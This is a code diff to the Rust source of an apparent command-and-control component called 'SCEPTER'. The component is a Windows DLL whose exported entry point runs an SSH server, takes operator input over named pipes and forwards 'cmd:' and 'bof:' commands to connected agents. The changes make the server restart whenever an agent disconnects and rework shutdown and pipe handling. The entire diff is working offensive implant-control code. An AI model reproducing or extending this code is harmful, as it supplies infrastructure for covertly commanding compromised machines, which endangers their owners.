@@ -9,7 +9,7 @@ use windows_sys::Win32::Foundation::{BOOL, CloseHandle, HANDLE};
 
 use debug_print::{debug_eprintln, debug_println};
 use rand_core::OsRng;
-use russh::server::{Msg, Server as _, Session};
+use russh::server::{Handler, Msg, Server as _, Session};
 use russh::*;
 use scepter_common::pipe::{initialize_input_pipe, initialize_output_pipe, write_output};
 pub use scepter_common::*;
@@ -22,22 +22,23 @@ use windows_sys::Win32::System::Threading::{CreateThread, INFINITE, WaitForSingl
 static mut G_H_INPUT_PIPE: HANDLE = 0 as HANDLE;
 static mut G_H_OUTPUT_PIPE: HANDLE = 0 as HANDLE;
 
+static mut G_EXIT_FLAG: bool = false;
+
 #[unsafe(no_mangle)]
 #[tokio::main(flavor = "current_thread")]
 pub async fn dll_main() {
     debug_println!("Initialized handles");
     debug_println!("Starting server");
 
-    // Initialize output pipe
+    // Initialize pipes once at startup and keep them open
     unsafe {
         G_H_OUTPUT_PIPE = initialize_output_pipe().unwrap_or_else(|| {
             debug_eprintln!("Failed to initialize output pipe.");
             TerminateThread(GetCurrentThread(), 1);
-            0 as HANDLE // Rust silliness
+            0 as HANDLE
         });
     }
 
-    // Execute the async function on this thread's runtime
     unsafe  {
         pipe::write_output(G_H_OUTPUT_PIPE, "[SCEPTER] Server initiated.")
     };
@@ -47,7 +48,6 @@ pub async fn dll_main() {
         auth_rejection_time: std::time::Duration::from_secs(10),
         auth_rejection_time_initial: Some(std::time::Duration::from_secs(0)),
         keys: vec![
-            // TODO can probably make this a verifiable component so agent only talks to intended ssh server
             russh::keys::PrivateKey::random(&mut OsRng, russh::keys::Algorithm::Ed25519).unwrap(),
         ],
         preferred: Preferred {
@@ -55,58 +55,83 @@ pub async fn dll_main() {
         },
         ..Default::default()
     };
+
     let config = Arc::new(config);
-    let sh = Server {
-        clients: Arc::new(Mutex::new(HashMap::new())),
-        id: 0,
-    };
 
     let interface_ip = String::from_utf8_lossy(SSH_INTERFACE_IPV4_ADDRESS)
         .to_string()
         .trim_matches(char::from(0))
         .to_string();
 
-    // Clone sh if needed (if it's a type that implements Clone)
-    let mut sh_clone = sh.clone();
-
-    debug_println!("Starting command loop");
-
-    // Create a new thread with its own tokio runtime
-    thread::spawn(move || {
-        debug_println!("Initializing handles");
-
-        unsafe {
-            // Initializing the input pipe is blocking, so agent should already be trying to connect to us
-            G_H_INPUT_PIPE = initialize_input_pipe().unwrap_or_else(|| {
-                debug_eprintln!("Failed to initialize input pipe.");
-                TerminateThread(GetCurrentThread(), 1);
-                0 as HANDLE // Rust silliness
-            });
-        }
-
-        // Create a new tokio runtime for this thread
-        let rt = Runtime::new().unwrap();
-
-        // Clone the object if needed
-        let mut sh_clone = sh.clone();
-
-        rt.block_on(async {
-            sh_clone.command_loop().await;
-        });
-    });
-
     let interface_port = str::from_utf8(SSH_PORT)
         .unwrap()
         .trim_matches(char::from(0))
         .parse::<u16>()
         .unwrap();
-    debug_println!("Starting server on {}:{}", interface_ip, interface_port);
-    sh_clone
-        .run_on_address(config, (interface_ip, interface_port))
-        .await
-        .unwrap();
 
-    debug_println!("Exiting server")
+    let mut ssh_server = Server {
+        clients: Arc::new(Mutex::new(HashMap::new())),
+        id: 0,
+    };
+
+    // Start command loop once
+    let mut command_server = ssh_server.clone();
+    thread::spawn(move || {
+
+        unsafe {
+            // If we're not initialized, initialize the input pipe
+            if G_H_OUTPUT_PIPE == 0 as HANDLE {
+                G_H_INPUT_PIPE = initialize_input_pipe().unwrap_or_else(|| {
+                    debug_eprintln!("Failed to initialize input pipe.");
+                    TerminateThread(GetCurrentThread(), 1);
+                    0 as HANDLE
+                });
+            }
+        }
+
+        let rt = Runtime::new().unwrap();
+        rt.block_on(async {
+            command_server.command_loop().await;
+        });
+    });
+
+    debug_println!("Starting command loop");
+    // Run the server on the specified interface
+    // Do this in a loop so we restart the server if an agent unexpectedly disconnects
+    loop {
+        debug_println!("Starting server on {}:{}", interface_ip, interface_port);
+        let server = &ssh_server.clone();
+        server.clone()
+            .run_on_address(config.clone(), (interface_ip.clone(), interface_port.clone()))
+            .await
+            .unwrap();
+
+        unsafe {
+            // Check if we're supposed to exit
+            if G_EXIT_FLAG == true {
+                break;
+            }
+        }
+    }
+
+    unsafe {
+        if G_H_OUTPUT_PIPE != 0 as HANDLE {
+            pipe::write_output(G_H_OUTPUT_PIPE, "[SCEPTER] Server shutting down.");
+        }
+
+        if G_H_OUTPUT_PIPE != 0 as HANDLE {
+            CloseHandle(G_H_OUTPUT_PIPE);
+            G_H_OUTPUT_PIPE = 0 as HANDLE;
+        }
+        if G_H_INPUT_PIPE != 0 as HANDLE {
+            CloseHandle(G_H_INPUT_PIPE);
+            G_H_INPUT_PIPE = 0 as HANDLE;
+        }
+
+        std::process::exit(0);
+    }
+
+    debug_println!("Exiting server");
 }
 
 #[derive(Clone)]
@@ -144,7 +169,8 @@ impl Server {
             };
             let input = input.trim_matches(char::from(0));
             if input.eq("exit") {
-                std::process::exit(0);
+                unsafe { G_EXIT_FLAG = true; }
+                break;
             }
             if input.starts_with("cmd:") || input.starts_with("bof:") {
                 debug_println!("Sending command to agent: {}", input);
@@ -284,15 +310,6 @@ impl server::Handler for Server {
 impl Drop for Server {
     fn drop(&mut self) {
         let id = self.id;
-
-        unsafe {
-            if G_H_OUTPUT_PIPE != 0 as HANDLE {
-                CloseHandle(G_H_OUTPUT_PIPE);
-            }
-            if G_H_INPUT_PIPE != 0 as HANDLE {
-                CloseHandle(G_H_INPUT_PIPE);
-            }
-        }
 
         let clients = self.clients.clone();
         tokio::spawn(async move {
